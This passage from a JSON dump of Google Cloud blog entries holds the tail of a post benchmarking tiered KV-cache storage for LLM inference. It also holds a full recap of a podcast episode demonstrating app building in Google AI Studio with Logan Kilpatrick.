baseline;\">System Prompt Length</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Best-performing Storage Setup</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Mean TTFT (ms) Change (%) vs. HBM only</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Input Throughput Change (%) vs. HBM only</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Mean End-to-End Latency Change (%) vs. HBM only</span></strong></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">1000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+5%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+1%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-1%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">5000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-6%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+27%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-21%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">10000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+121%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+23%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-19%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">50000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+48%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+69%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-41%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">100000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-3%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+130%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-57%</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p> </p>\n<h2><span style=\"vertical-align: baseline; color: #202124;\">Summary</span></h2>\n<p><span style=\"vertical-align: baseline; color: #202124;\">These results clearly demonstrate that a tiered storage solution significantly improves LLM inference performance by leveraging node-local storage, especially in scenarios with long system prompts that generate large KV Caches.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"color: #202124;\">Optimizing LLM inference is a complex challenge requiring the coordinated effort of multiple infrastructure components (storage, compute, networking). Our work is part of a broader initiative to enhance the entire end-to-end inference stack, from intelligent load balancing at the</span> </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Inference Gateway</span></a><span style=\"vertical-align: baseline;\"> <span style=\"color: #202124;\">to advanced caching logic within the model server.</span></span></p>\n<p><span style=\"vertical-align: baseline; color: #202124;\">We are actively exploring further enhancements by integrating additional remote storage solutions with LMCache.</span></p>\n</div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"LLM Cache on Kubernetes Blog Post\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/LLM_Cache_on_Kubernetes_Blog_Post.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2>Next Steps</h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get started with the same setup </span><a href=\"https://github.com/vllm-project/production-stack/blob/main/tutorials/cloud_deployments/04-GCP-GKE-lmcache-local-disk.md\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">mentioned above on GKE</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://llm-d.ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Keep up to date on the LLM-D Inference Stack</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 11:36:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-build-ai-apps-in-minutes-with-googles-logan-kilpatrick/",
        "title": "Agent Factory Recap: Build AI Apps in Minutes with Google's Logan Kilpatrick",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Build-ai-apps-in-minutes-google-ai-studio.max-600x600.png",
        "author": "Smitha Kolan",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In our latest episode of </span><a href=\"https://www.youtube.com/playlist?list=PLIivdWyY5sqLXR1eSkiM5bE6pFlXC-OSs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">The Agent Factory</span></a><span style=\"vertical-align: baseline;\">, we were thrilled to welcome Logan Kilpatrick from </span><a href=\"https://deepmind.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Deep Mind</span></a><span style=\"vertical-align: baseline;\"> for a </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> session that showcased the tools shaping the future of AI development. Logan, who has had a front-row seat to the generative AI revolution at both OpenAI and now Google, gave us a hands-on tour of the </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> experience in </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">, showing just how fast you can go from an idea to a fully-functional AI application.</span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=azvA2Bn2aXw\">\n\n      \n        <img alt=\"A podcast discussing vibe coding in Google AI Studio\" src=\"https://img.youtube.com/vi/azvA2Bn2aXw/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=azvA2Bn2aXw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This post guides you through the key ideas from our conversation. Use it to quickly recap topics or dive deeper into specific segments with links and timestamps.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Build Experience in Google AI Studio - What is it?</span></h2>\n<p><span style=\"vertical-align: baseline;\">This episode focused on the </span><a href=\"https://aistudio.google.com/apps\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Build feature</span></a><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> and Logan used the term </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> to describe the experience of using it. This feature is designed to radically accelerate how developers create </span><a href=\"https://cloud.google.com/discover/ai-applications?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-powered apps</span></a><span style=\"vertical-align: baseline;\">. The core idea is to move from a natural language prompt of an idea for an app to a live, running application in under a minute. It handles the scaffolding, code generation, and even error correction, allowing you to focus on iterating and refining your idea.</span></p>\n<h2><span style=\"vertical-align: baseline;\">The Factory Floor</span></h2>\n<p><span style=\"vertical-align: baseline;\">The Factory Floor is our segment for getting hands-on. Here, we moved from high-level concepts to practical code with live demos.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Vibe Coding a Virtual Food Photographer</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=-D3tQT9R06KkrdzM&amp;t=74\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">01:14</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">To kick things off, Logan hit the \"I'm Feeling Lucky\" button to generate a random app idea: a virtual food photographer for restaurant owners. The goal was to </span><a href=\"https://aistudio.google.com/apps\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">build</span></a><span style=\"vertical-align: baseline;\"> an app that could:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Accept a simple text-based menu.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Generate realistic, high-end photography for each dish.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Allow for style toggles like \"rustic and dark\" or \"bright and modern.\"</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">In about 90 seconds, we had a running web app. Logan fed it a quirky menu of pizza, blueberries, and popcorn, and the app generated images of each. We also saw how you can use AI-suggested features to iteratively adjust the prepared photos—like adding butter to the popcorn, and add functionality—like changing the entire design aesthetic of the site.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"food-photographer-2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/food-photographer-2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Grounding with Google Maps</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=I7-NVKOnceWz5uUe&amp;t=625\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">10:25</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">Next, Logan showcased one of the most exciting new features: </span><a href=\"https://blog.google/technology/developers/grounding-google-maps-gemini-api/?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">grounding with Google Maps</span></a><span style=\"vertical-align: baseline;\">. This allows the </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini models</span></a><span style=\"vertical-align: baseline;\"> to connect directly to Google Maps to pull in rich, real-time place data without setting up a separate API. He demonstrated a starter template app that acted as a local guide, finding Italian restaurants in Chicago and describing the neighborhood.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"google-maps-grounding\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/google-maps-grounding.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Exploring the AI Studio Gallery</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=XTNVEE70JsZ-64Gx&amp;t=895\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">14:55</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">For developers looking for inspiration, Logan walked us through the </span><a href=\"https://aistudio.google.com/apps?source=showcase\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Studio Gallery</span></a><span style=\"vertical-align: baseline;\">. This is a collection of pre-built, interactive examples that show what the models are capable of. Two highlights were:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prompt DJ:</strong><span style=\"vertical-align: baseline;\"> An app that uses the </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/music/generate-music?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lyria model</span></a><span style=\"vertical-align: baseline;\"> to generate novel, real-time music based on a prompt.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Vibe Check:</strong><span style=\"vertical-align: baseline;\"> A fun tool for visually testing and comparing how different models respond to the same prompt, which is becoming a popular way for developers to quickly evaluate a model's suitability for their use case.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"exploring-AIstudio-gallery\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/exploring-AIstudio-gallery.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">\"Yap to App\": A Conversational Pair Programmer</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=orrbTaI8Hul5UWMu&amp;t=1191\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">19:51</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">For the final demo, Logan used a speech-to-text input to describe an app idea which he called \"Yap to App\". His pitch: an AI pair programmer that could generate HTML code and then vocally coach him on how to improve it. After turning his spoken request into a written prompt, AI Studio built a voice-interactive app. The AI assistant generated a simple HTML card and then, when asked, provided verbal suggestions for improvement. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"yapp-to-app\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/yapp-to-app.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">The Agent Industry Pulse</span></h2>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=0OoxIssx045SIByw&amp;t=1579\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">26:19</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">In this segment, we covered some of the biggest recent launches in the </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agent</span></a><span style=\"vertical-align: baseline;\"> ecosystem:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://ai.google.dev/gemini-api/docs/video?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Veo 3.1</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Google's new state-of-the-art video generation model that builds on Veo 3, adding richer native audio and the ability to define the first and last frames of a video to generate seamless transitions. Smitha showcased a quick applet, built entirely in AI Studio, where users can upload a selfie of themselves and generate a video of their future career in AI using Veo 3.1.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Anthropic's Skills:</strong><span style=\"vertical-align: baseline;\"> A new feature that allows you to give Claude specific tools (like an Excel script) that it can decide to use on its own to complete a task. We compared this to Gemini Gems, noting the difference in approach between creating a persona (Gem) and providing a tool (Skill).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Recent Google Launches:</strong><span style=\"vertical-align: baseline;\"> Logan highlighted several other key releases, including the new </span><a href=\"https://blog.google/technology/google-deepmind/gemini-computer-use-model/?utm_campaign=CDR_0x6e136736_awareness_b452057599&amp;utm_medium=external&amp;utm_source=youtube\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini computer use model</span></a><span style=\"vertical-align: baseline;\"> for building agents that can navigate browsers, updates to the </span><a href=\"https://ai.google.dev/gemini-api/docs/models?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Flash and Flash-Lite models</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://blog.google/technology/developers/ai-studio-updates-more-control/?utm_campaign=CDR_0x6e136736_awareness_b452057599&amp;utm_medium=external&amp;utm_source=youtube\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">foundational upgrades to the AI Studio experience</span></a><span style=\"vertical-align: baseline;\"> itself.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Logan Kilpatrick on the Future of AI Development</span></h2>\n<p><span style=\"vertical-align: baseline;\">We also had the chance to discuss the bigger picture with Logan, from developer reactions to the future of models themselves.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Grounding with Google Maps</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=oxku5g-tCB3O1oWJ&amp;t=1886\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">31:26</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">When asked which launch developers have been most excited about, Logan admitted he was surprised by the overwhelmingly positive reception for </span><a href=\"https://blog.google/technology/developers/grounding-google-maps-gemini-api/?utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">grounding with Google Maps</span></a><span style=\"vertical-align: baseline;\">. He noted that the </span><a href=\"https://mapsplatform.google.com/lp/maps-apis/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Maps API</span></a><span style=\"vertical-align: baseline;\"> is one of the most widely used developer APIs in the world, and making it incredibly simple to integrate with Gemini unlocked key use cases for countless developers and startups.</span></p>\n<h3><span style=\"vertical-align: baseline;\">From Models to Systems: The Next Frontier</span></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Timestamp</span><strong style=\"font-style: italic; vertical-align: baseline;\">:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> [</span><a href=\"https://youtu.be/azvA2Bn2aXw?si=icS7YYRGOJOHRwes&amp;t=1946\" rel=\"noopener\" target=\"_blank\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">32:26</span></a><span style=\"font-style: italic; vertical-align: baseline;\">]</span></p>\n<p><span style=\"vertical-align: baseline;\">Looking ahead, Logan shared his excitement for the continued progress on code generation, which he sees as a fundamental accelerant for all other AI capabilities. He also pointed out a trend: models are evolving from simple tools into complex systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">Historically, a model was something that took a token in and produced a token out. Now, models are starting to look more like </span><a href=\"https://cloud.google.com/discover/what-are-ai-agents?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agents</span></a><span style=\"vertical-align: baseline;\"> out of the box. They can take actions: spinning up code sandboxes, pinging APIs, and navigating browsers. \"Folks have thought about agents and models as these decoupled concepts,\" Logan said, \"and it feels like they're coming closer and closer together as the model capabilities keep improving.\"</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">This conversation was a powerful reminder of how quickly the barrier to entry for building sophisticated AI applications is falling. With tools like </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">, the ability to turn a creative spark into a working prototype is no longer a matter of weeks or days, but minutes. The focus is shifting from complex scaffolding to rapid, creative iteration.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Your turn to build</span></h2>\n<p><span style=\"vertical-align: baseline;\">We hope this episode inspired you to get hands-on. Head over to </span><a href=\"https://aistudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> to try out </span><a href=\"https://cloud.google.com/discover/what-is-vibe-coding?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452058652&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vibe coding</span></a><span style=\"vertical-align: baseline;\"> for yourself, and don't forget to watch the full episode for all the details.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with us</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Logan </span><span style=\"vertical-align: baseline;\"> → </span><a href=\"https://www.linkedin.com/in/logankilpatrick/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/OfficialLoganK\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://bsky.app/profile/officiallogank.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BlueSky</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://logank.ai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Mollie </span><span style=\"vertical-align: baseline;\"> → </span><a href=\"https://www.linkedin.com/in/molliepettit/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, <a href=\"https://x.com/MollzMP\" rel=\"noopener\" target=\"_blank\">X</a>, </span><a href=\"https://bsky.app/profile/mollzmp.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BlueSky</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Smitha → </span><a href=\"https://www.linkedin.com/in/smithakolan/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.youtube.com/@smithakolan\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">YouTube</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/smithakolan\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.instagram.com/girlknowsai/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Instagram</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-07 10:24:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/build-your-first-adk-agent-workforce/",
        "title": "Build Your First ADK Agent Workforce",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/hero_image___developing_agents.max-600x600.png",
        "author": "Mollie Pettit",
        "track": null,
